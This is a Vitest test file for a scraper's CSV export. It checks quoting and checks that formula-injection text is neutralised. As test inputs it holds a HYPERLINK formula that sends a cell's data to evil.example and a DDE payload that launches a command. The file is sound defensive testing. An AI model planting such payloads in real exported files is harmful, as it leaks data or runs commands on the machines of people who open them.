import { describe, expect, it } from "vitest";
import { csvCell, toCsv } from "../../src/scrape/csv.js";

describe("toCsv", () => {
  it("a header of the fields, CRLF ends, quotes for a comma, a quote, or a line break; null is empty", () => {
    expect(toCsv([{ zone: "Pune, MH", note: 'a "b"', n: 5, ok: true, x: null }], ["zone"])).toBe('zone,note,n,ok,x\r\n"Pune, MH","a ""b""",5,true,\r\n');
    expect(csvCell("two\nlines")).toBe('"two\nlines"');
  });
  it("a text that a spreadsheet reads as a formula gets a quote mark first (=, +, -, @, tab, CR); a number does not", () => {
    const evil = '=HYPERLINK("https://evil.example/?d="&B2,"Buy")';
    expect(toCsv([{ name: evil, price: 10 }])).toBe(`name,price\r\n"'=HYPERLINK(""https://evil.example/?d=""&B2,""Buy"")",10\r\n`);
    expect(csvCell("=cmd|' /C calc'!A0")).toBe("'=cmd|' /C calc'!A0");
    expect(csvCell("+1 555")).toBe("'+1 555");
    expect(csvCell("-2+3")).toBe("'-2+3");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("\t=1")).toBe("'\t=1");
    expect(csvCell("\r=1")).toBe("\"'\r=1\"");
    expect(csvCell(-12)).toBe("-12");
    expect(csvCell("Amul Taaza")).toBe("Amul Taaza");
  });
});
